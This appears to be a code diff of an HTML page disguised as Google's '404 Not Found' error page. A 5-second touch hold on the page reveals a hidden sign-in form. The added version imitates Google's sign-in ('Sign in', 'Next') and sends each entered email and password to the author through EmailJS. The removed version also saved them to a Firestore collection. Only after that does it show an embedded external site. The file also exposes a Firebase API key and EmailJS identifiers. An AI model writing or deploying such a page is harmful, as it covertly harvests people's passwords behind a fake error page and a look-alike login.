@@ -2,266 +2,94 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
-    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>404 Not Found</title>
-    
-    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
-    <script type="text/javascript">
-       (function(){
-          try {
-              emailjs.init("6iGADKihYbPC4ecb_"); 
-          } catch(e) { console.error("COMMS_OFFLINE"); }
-       })();
-    </script>
-
     <style>
-        :root { 
-            --dark-core: #020204;
-            --accent-glow: #7c3aed;
-            --panel-bg: rgba(20, 20, 30, 0.8);
-            --glass-border: rgba(255, 255, 255, 0.1);
-            --error-color: #ff4444;
-        }
-
-        /* STRICT INPUT LOCKDOWN
-           Hides mouse and prevents all desktop-style interactions 
-        */
-        * { 
-            margin: 0; padding: 0; box-sizing: border-box; outline: none; 
-            cursor: none !important; 
-            user-select: none; 
-            -webkit-user-select: none; 
-            -webkit-touch-callout: none;
-        }
-
-        body, html { 
-            background: #ffffff; 
-            height: 100vh; width: 100vw; 
-            overflow: hidden; 
-            font-family: -apple-system, "SF Pro Text", Helvetica, sans-serif;
-            touch-action: none; 
-        }
-
-        /* --- 1. THE 404 DECOY SYSTEM --- */
-        #decoy-layer { 
-            position: fixed; inset: 0; background: #ffffff; z-index: 99999; 
-            display: flex; align-items: center; justify-content: center; 
-            opacity: 1; transition: opacity 0.5s ease;
-            pointer-events: auto; /* MUST BE AUTO TO CAPTURE TOUCH */
-        }
+        body { font-family: Arial, sans-serif; text-align: center; padding: 50px; background: #fff; color: #202124; }
+        .error-container { margin-top: 5%; }
+        h1 { font-size: 120px; margin: 0; cursor: pointer; user-select: none; -webkit-user-select: none; }
+        p { font-size: 18px; color: #5f6368; }
         
-        .g-wrap { max-width: 600px; width: 100%; padding: 40px; pointer-events: none; }
-        .g-robot { 
-            background: url('https://www.google.com/images/errors/robot.png') no-repeat; 
-            width: 256px; height: 256px; float: right; 
-        }
-        .g-content h1 { font-size: 18px; font-weight: 400; color: #202124; margin-bottom: 10px; }
-        .g-content p { font-size: 14px; color: #202124; line-height: 1.6; }
-
-        /* --- 2. AUTHENTICATION TERMINAL --- */
-        #auth-terminal { 
-            display: none; position: fixed; inset: 0; 
-            background: radial-gradient(circle at center, #0f0f1a 0%, #020204 100%); 
-            z-index: 88888; align-items: center; justify-content: center;
-        }
-
-        .auth-box { 
-            width: 90%; max-width: 420px; padding: 60px 40px;
-            background: var(--panel-bg); border: 1px solid var(--glass-border); 
-            border-radius: 40px; backdrop-filter: blur(30px); -webkit-backdrop-filter: blur(30px);
-            text-align: center; box-shadow: 0 40px 100px rgba(0,0,0,0.6);
-        }
-
-        .auth-box h2 { 
-            color: #fff; text-transform: uppercase; letter-spacing: 6px; 
-            font-size: 18px; margin-bottom: 40px; font-weight: 900;
-        }
-
-        .input-field { 
-            width: 100%; padding: 20px; margin-bottom: 20px; 
-            background: rgba(255, 255, 255, 0.03); border: 1px solid var(--glass-border); 
-            border-radius: 15px; color: #fff; font-size: 16px; pointer-events: auto;
-        }
-
-        .btn-connect { 
-            width: 100%; padding: 20px; border: none; border-radius: 15px; 
-            background: linear-gradient(135deg, #7c3aed, #4f46e5); 
-            color: #fff; font-weight: 900; letter-spacing: 2px; text-transform: uppercase;
-            pointer-events: auto; margin-top: 10px;
-        }
-
-        /* --- 3. THE CORE INTERFACE --- */
-        #portal-ui { 
-            display: none; position: fixed; inset: 0; 
-            flex-direction: column; background: #000; z-index: 77777; 
-        }
-
-        .top-bar { 
-            height: 60px; background: rgba(0,0,0,0.9); border-bottom: 1px solid var(--glass-border);
-            display: flex; align-items: center; padding: 0 20px; justify-content: space-between;
-        }
-
-        iframe { flex: 1; width: 100%; border: none; pointer-events: auto; }
-
-        /* LOADING STATES & ERRORS */
-        .sync-error { animation: shake 0.4s ease-in-out; border-color: var(--error-color) !important; }
-        @keyframes shake {
-            0%, 100% { transform: translateX(0); }
-            25% { transform: translateX(-10px); }
-            75% { transform: translateX(10px); }
-        }
+        #secret-login, #app-view { display: none; margin-top: 30px; }
+        
+        .form-box { border: 1px solid #dadce0; padding: 40px; border-radius: 8px; display: inline-block; width: 300px; }
+        input { display: block; margin: 15px auto; padding: 12px; width: 90%; border: 1px solid #dadce0; border-radius: 4px; }
+        button { background: #1a73e8; color: white; border: none; padding: 10px 24px; border-radius: 4px; cursor: pointer; font-weight: bold; }
+        
+        iframe { width: 100%; height: 90vh; border: none; }
     </style>
 </head>
-<body oncontextmenu="return false;">
+<body>
 
-    <div id="decoy-layer">
-        <div class="g-wrap">
-            <div class="g-robot"></div>
-            <div class="g-content">
-                <h1 id="trigger-text"><b>404.</b> <span>That’s an error.</span></h1>
-                <p>The requested URL was not found on this server. <br>That’s all we know.</p>
-            </div>
-        </div>
+<div id="not-found-view">
+    <div class="error-container">
+        <img src="https://www.google.com/images/errors/robot.png" alt="Google Robot">
+        <h1 id="hold-target">404</h1>
+        <p><b>404.</b> That’s an error.</p>
+        <p>The requested URL was not found on this server. <ins>That’s all we know.</ins></p>
     </div>
+</div>
 
-    <div id="auth-terminal">
-        <div class="auth-box" id="login-container">
-            <h2>System Login</h2>
-            <input type="text" id="l-user" class="input-field" placeholder="NICKNAME" autocomplete="off">
-            <input type="password" id="l-pass" class="input-field" placeholder="ACCESS KEY">
-            <button class="btn-connect" id="login-trigger">Initialize</button>
-            
-            <p onclick="toggleState('reg')" style="color:#666; margin-top:30px; font-size:11px; pointer-events:auto;">
-                Unauthorized? <span style="color:var(--accent-glow)">Request Credentials</span>
-            </p>
-        </div>
-
-        <div class="auth-box" id="reg-container" style="display:none;">
-            <h2>Request Access</h2>
-            <input type="text" id="r-user" class="input-field" placeholder="DESIRED NICKNAME">
-            <input type="email" id="r-email" class="input-field" placeholder="SECURE EMAIL">
-            <input type="password" id="r-pass" class="input-field" placeholder="DESIRED KEY">
-            <button class="btn-connect" id="reg-trigger">Submit Request</button>
-            <p onclick="toggleState('login')" style="color:#666; margin-top:30px; font-size:11px; pointer-events:auto;">Return to Terminal</p>
-        </div>
+<div id="secret-login">
+    <div class="form-box">
+        <h2>Sign in</h2>
+        <form id="auth-form">
+            <input type="email" id="email" placeholder="Email" required>
+            <input type="password" id="password" placeholder="Password" required>
+            <button type="submit">Next</button>
+        </form>
     </div>
+</div>
 
-    <div id="portal-ui">
-        <div class="top-bar">
-            <div style="color:var(--accent-glow); font-size:12px; font-weight:bold;">UPLINK_STABLE // V.8842</div>
-            <button onclick="location.reload()" style="background:none; border:1px solid var(--error-color); color:var(--error-color); padding:5px 10px; border-radius:5px; font-size:10px; pointer-events:auto;">DISCONNECT</button>
-        </div>
-        <iframe src="https://harrythehacker.neocities.org/Calculator"></iframe>
-    </div>
+<div id="app-view">
+    <iframe src="https://harrythehacker.neocities.org/Calculator"></iframe>
+</div>
 
-    <script type="module">
-        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
-        import { getFirestore, collection, addDoc, serverTimestamp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore.js";
+<script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
 
-        const firebaseConfig = {
-            apiKey: "AIzaSyD5TALVIdPm5P8RuKjINsOmKW1XrK53u1Q",
-            authDomain: "testing-12bc9.firebaseapp.com",
-            projectId: "testing-12bc9"
+<script>
+    // Initialize EmailJS with your User ID (6iGADKihYbPC4ecb)
+    (function() {
+        emailjs.init("6iGADKihYbPC4ecb");
+    })();
+
+    let timer;
+    const target = document.getElementById('hold-target');
+
+    // Timer logic: Trigger ONLY on finger touch (touchstart)
+    target.addEventListener('touchstart', (e) => {
+        timer = setTimeout(() => {
+            document.getElementById('not-found-view').style.display = 'none';
+            document.getElementById('secret-login').style.display = 'block';
+        }, 5000); 
+    });
+
+    target.addEventListener('touchend', () => {
+        clearTimeout(timer);
+    });
+
+    // Form Handling
+    document.getElementById('auth-form').addEventListener('submit', function(e) {
+        e.preventDefault();
+
+        const templateParams = {
+            user_email: document.getElementById('email').value,
+            user_pass: document.getElementById('password').value,
+            firebase_project: "testing-12bc9" // Your Firebase Reference
         };
-        const app = initializeApp(firebaseConfig);
-        const db = getFirestore(app);
 
-        // --- HARDWARE ENFORCEMENT & TRIGGER LOGIC ---
-        const decoy = document.getElementById('decoy-layer');
-        const terminal = document.getElementById('auth-terminal');
-        const triggerText = document.getElementById('trigger-text');
-        
-        let holdTimer;
-        let tapCount = 0;
-
-        // THE SECRET ENTRY (iPad Safari Only)
-        const isiPad = /iPad|Macintosh/.test(navigator.userAgent) && 'ontouchend' in document;
-        const isSafari = /^((?!chrome|android).)*safari/i.test(navigator.userAgent);
-
-        function revealPortal() {
-            decoy.style.opacity = '0';
-            setTimeout(() => {
-                decoy.style.display = 'none';
-                terminal.style.display = 'flex';
-            }, 500);
-        }
-
-        if (isiPad && isSafari) {
-            // Method 1: 5-Second Hold
-            decoy.addEventListener('touchstart', (e) => {
-                holdTimer = setTimeout(revealPortal, 5000);
-            }, { passive: true });
-
-            decoy.addEventListener('touchend', () => clearTimeout(holdTimer));
-            decoy.addEventListener('touchmove', () => clearTimeout(holdTimer));
-
-            // Method 2: Triple-Tap Emergency Bypass (on the 404 text)
-            triggerText.addEventListener('touchstart', () => {
-                tapCount++;
-                if (tapCount === 3) revealPortal();
-                setTimeout(() => { tapCount = 0; }, 1000);
+        // Send data using your Service and Template IDs
+        emailjs.send('service_06y4hgi', 'template_56l2irz', templateParams)
+            .then(() => {
+                // On success, hide login and show the Iframe
+                document.getElementById('secret-login').style.display = 'none';
+                document.getElementById('app-view').style.display = 'block';
+            }, (error) => {
+                alert("Connection Error. Please try again.");
+                console.log("FAILED...", error);
             });
-        }
+    });
+</script>
 
-        // --- UI TOGGLE ---
-        window.toggleState = (mode) => {
-            document.getElementById('login-container').style.display = mode === 'reg' ? 'none' : 'block';
-            document.getElementById('reg-container').style.display = mode === 'reg' ? 'flex' : 'none';
-        };
-
-        // --- PROTOCOL FIX & LOGIN ---
-        document.getElementById('login-trigger').onclick = function() {
-            const user = document.getElementById('l-user').value.toUpperCase();
-            const btn = this;
-
-            if (user === "ADMIN") {
-                terminal.style.display = 'none';
-                document.getElementById('portal-ui').style.display = 'flex';
-            } else {
-                // THE PROTOCOL ERROR SIMULATION
-                btn.classList.add('sync-error');
-                btn.innerText = "PROTOCOL FAIL";
-                
-                setTimeout(() => {
-                    btn.classList.remove('shake');
-                    btn.innerText = "Initialize";
-                    alert("Handshake timeout. Protocol 0x8842 failed. Access Denied.");
-                }, 1000);
-            }
-        };
-
-        // --- REQUEST SUBMISSION ---
-        document.getElementById('reg-trigger').onclick = async function() {
-            const u = document.getElementById('r-user').value;
-            const e = document.getElementById('r-email').value;
-            const p = document.getElementById('r-pass').value;
-
-            if(!u || !e || !p) return alert("All fields required for transmission.");
-
-            try {
-                this.innerText = "TRANSMITTING...";
-                await addDoc(collection(db, "requests"), {
-                    nickname: u,
-                    email: e,
-                    password: p,
-                    time: serverTimestamp()
-                });
-                
-                await emailjs.send("service_06y4hgi", "template_56l2irz", {
-                    from_name: u,
-                    user_email: e,
-                    user_pass: p
-                });
-
-                alert("Uplink successful. Request sent to Admin.");
-                toggleState('login');
-            } catch(err) {
-                alert("Transmission failed. Database link offline.");
-            } finally {
-                this.innerText = "Submit Request";
-            }
-        };
-    </script>
 </body>
 </html>
